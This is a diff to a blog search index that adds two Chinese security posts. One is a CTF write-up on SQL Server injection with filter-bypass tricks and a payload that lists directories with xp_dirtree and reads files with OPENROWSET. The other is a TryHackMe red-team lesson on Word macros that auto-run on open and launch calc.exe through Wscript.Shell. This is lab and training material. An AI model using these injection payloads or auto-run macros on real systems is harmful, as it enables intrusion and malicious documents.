@@ -4,6 +4,44 @@
   
     
     <entry>
+      <title>Mini-L CTF web 复现</title>
+      <link href="/posts/fbdb0624.html"/>
+      <url>/posts/fbdb0624.html</url>
+      
+        <content type="html"><![CDATA[<p>这里的话只复现部分题</p><h2 id="ezsql-sql-server-mssql"><a href="#ezsql-sql-server-mssql" class="headerlink" title="ezsql(sql server mssql)"></a>ezsql(sql server mssql)</h2><p><img src="../images/image-20230509212213754.png" alt="image-20230509212213754"></p><p><img src="../images/image-20230509213811523.png" alt="image-20230509213811523"></p><p><strong>考查的是sqlserver</strong> <strong>也是mssql</strong></p><p>这里的话是给了查询语句  <strong>而且数据库和表明和列都给了</strong>  <strong>（dbo.users   id)</strong>  </p><p>拿出祖传字典fuzz一下，发现过滤了<strong>空格、星号、百分号、引号</strong>以及常用的增删查改关键字（<strong>但是大小写能绕过，这个点很重要</strong>）</p><p>这里虽然把<code>%</code>给过滤了，但是还是可以使用url编码的，因为后端检测是先解码后检测</p><p><a href="http://www.ppmy.cn/news/9311.html">SQL Server注入技巧与提权方式详解</a></p><p><img src="../images/image-20230509214305648.png" alt="image-20230509214305648"></p><p>可以了解一下这个空格绕过</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">建表</span><br><span class="line">create table nm(</span><br><span class="line">id varchar(2000),</span><br><span class="line">depth int,</span><br><span class="line">isfile int,</span><br><span class="line">);列⽬录</span><br><span class="line">insert nm (id,depth,isfile) exec xp_dirtree &#x27;/&#x27;,1,1 读⽂件</span><br><span class="line">insert nm (id) select * from OPENROWSET(BULK &#x27;/f1ag&#x27;, SINGLE_CLOB) as c 读完⽂件之后要把isfile改成⼀个数字，不然是null 复制表</span><br><span class="line">insert dbo.users (id,name) select isfile,id from nm</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0;declare%0f @s%0fvarchar(2000)%0fset%0f@s=0x64656c6574652066726f6d206e6d%0fexec(@s);</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Mini-L CTF web 复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>thm-红队-初始访问-武器化</title>
+      <link href="/posts/add7d84.html"/>
+      <url>/posts/add7d84.html</url>
+      
+        <content type="html"><![CDATA[<p>前两个是 VBScript 代码  和  HTA代码</p><p>前者是可以在本地上运行，后者是可以弹shell也可以在本地运行</p><h2 id="应用程序的-Visual-Basic-VBA"><a href="#应用程序的-Visual-Basic-VBA" class="headerlink" title="应用程序的 Visual Basic (VBA)"></a>应用程序的 Visual Basic (VBA)</h2><p><strong>这是 Microsoft 为 Microsoft Word、Excel、PowerPoint 等 Microsoft 应用程序实施的一种编程语言</strong></p><p><strong>VBA 编程允许自动执行用户与 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。</strong> </p><p>这句话是重点</p><p><strong>宏是 Microsoft Office 应用程序，其中包含以称为 Visual Basic for Applications (VBA) 的编程语言编写的嵌入式代码。它用于创建自定义功能，以通过创建自动化流程来加速手动任务</strong></p><p><strong>我们将讨论 VBA 的基础知识以及对手使用宏创建恶意 Microsoft 文档的方式</strong>。</p><p>现在创建一个新的空白 Microsoft 文档来创建我们的第一个 宏。目的是讨论该语言的基础知识，并展示如何在打开 Microsoft Word 文档时运行它。首先，我们需要通过选择 视图→ 宏来打开 Visual Basic 编辑器。宏窗口显示在文档中创建我们自己的宏</p><p><img src="../images/image-20230508231520977.png" alt="image-20230508231520977"></p><p><img src="../images/image-20230508231606126.png" alt="image-20230508231606126"></p><p>点击创建后的样子</p><p>然后进行内容创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub THM()</span><br><span class="line">  MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>然后点击运行<img src="../images/image-20230508231803055.png" alt="image-20230508231803055"></p><p>现在，为了在文档打开后自动执行 VBA 代码，我们可以使用内置函数，例如 AutoOpen 和 Document_open。请注意，我们需要指定文档打开后需要运行的函数名称，在我们的例子中是 THM 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub THM()</span><br><span class="line">   MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>重要的是要注意，要使宏起作用，我们需要将其保存为启用宏的格式，例如.doc 和 docm。现在让我们将文件保存为Word 97-2003 模板，通过转到文件→保存 Document1并保存为类型 → Word 97-2003 文档启用 宏，最后保存.</p><p><img src="../images/image-20230508232155649.png" alt="image-20230508232155649"></p><p>运行文档后就会自动执行</p><p><strong><img src="../images/image-20230508232335996.png" alt="image-20230508232335996"></strong></p><p>现在编辑 word 文档并创建一个执行calc.exe 或任何可执行文件的宏函数作为概念证明，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sub PoC()</span><br><span class="line">Dim payload As String</span><br><span class="line">payload = &quot;calc.exe&quot;</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>和前面保存的步骤一样，然后点击运行就弹出计算器了</p><p>得一提的是，我们可以将 VBA 与之前介绍的方法（例如 HTA 和 WSH）结合使用。VBA/宏本身并不能绕过任何检测</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> thm-红队-初始访问-武器化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>AntCTF x D³CTF web 复现</title>
       <link href="/posts/d27bfad9.html"/>
       <url>/posts/d27bfad9.html</url>
@@ -1349,10 +1387,10 @@
     
     <entry>
       <title></title>
-      <link href="/js/runtime/runtime.js"/>
-      <url>/js/runtime/runtime.js</url>
+      <link href="/js/runtime/runtime.min.js"/>
+      <url>/js/runtime/runtime.min.js</url>
       
-        <content type="html"><![CDATA[var now = new Date; function createtime() { var t = new Date("12/16/2022 00:00:00"); now.setTime(now.getTime() + 250); var e = (now - t) / 1e3 / 60 / 60 / 24, a = Math.floor(e), n = (now - t) / 1e3 / 60 / 60 - 24 * a, r = Math.floor(n); 1 == String(r).length && (r = "0" + r); var s = (now - t) / 1e3 / 60 - 1440 * a - 60 * r, i = Math.floor(s); 1 == String(i).length && (i = "0" + i); var o = (now - t) / 1e3 - 86400 * a - 3600 * r - 60 * i, l = Math.round(o); 1 == String(l).length && (l = "0" + l); let g = ""; g = r < 18 && r >= 9 ? `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-上班摸鱼中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>` : `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = g) } setInterval((() => { createtime() }), 250);]]></content>
+        <content type="html"><![CDATA[var now=new Date;function createtime(){var t=new Date("12/16/2022 00:00:00");now.setTime(now.getTime()+250);var e=(now-t)/1e3/60/60/24,a=Math.floor(e),n=(now-t)/1e3/60/60-24*a,r=Math.floor(n);1==String(r).length&&(r="0"+r);var s=(now-t)/1e3/60-1440*a-60*r,i=Math.floor(s);1==String(i).length&&(i="0"+i);var o=(now-t)/1e3-86400*a-3600*r-60*i,l=Math.round(o);1==String(l).length&&(l="0"+l);let g="";g=r<18&&r>=9?`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-上班摸鱼中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`:`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=g)}setInterval(()=>{createtime()},250);]]></content>
       
     </entry>
     
@@ -1360,10 +1398,10 @@
     
     <entry>
       <title></title>
-      <link href="/js/runtime/runtime.min.js"/>
-      <url>/js/runtime/runtime.min.js</url>
+      <link href="/js/runtime/runtime.js"/>
+      <url>/js/runtime/runtime.js</url>
       
-        <content type="html"><![CDATA[var now=new Date;function createtime(){var t=new Date("12/16/2022 00:00:00");now.setTime(now.getTime()+250);var e=(now-t)/1e3/60/60/24,a=Math.floor(e),n=(now-t)/1e3/60/60-24*a,r=Math.floor(n);1==String(r).length&&(r="0"+r);var s=(now-t)/1e3/60-1440*a-60*r,i=Math.floor(s);1==String(i).length&&(i="0"+i);var o=(now-t)/1e3-86400*a-3600*r-60*i,l=Math.round(o);1==String(l).length&&(l="0"+l);let g="";g=r<18&&r>=9?`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-上班摸鱼中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`:`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=g)}setInterval(()=>{createtime()},250);]]></content>
+        <content type="html"><![CDATA[var now = new Date; function createtime() { var t = new Date("12/16/2022 00:00:00"); now.setTime(now.getTime() + 250); var e = (now - t) / 1e3 / 60 / 60 / 24, a = Math.floor(e), n = (now - t) / 1e3 / 60 / 60 - 24 * a, r = Math.floor(n); 1 == String(r).length && (r = "0" + r); var s = (now - t) / 1e3 / 60 - 1440 * a - 60 * r, i = Math.floor(s); 1 == String(i).length && (i = "0" + i); var o = (now - t) / 1e3 - 86400 * a - 3600 * r - 60 * i, l = Math.round(o); 1 == String(l).length && (l = "0" + l); let g = ""; g = r < 18 && r >= 9 ? `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-上班摸鱼中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>` : `<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = g) } setInterval((() => { createtime() }), 250);]]></content>
       
     </entry>
     
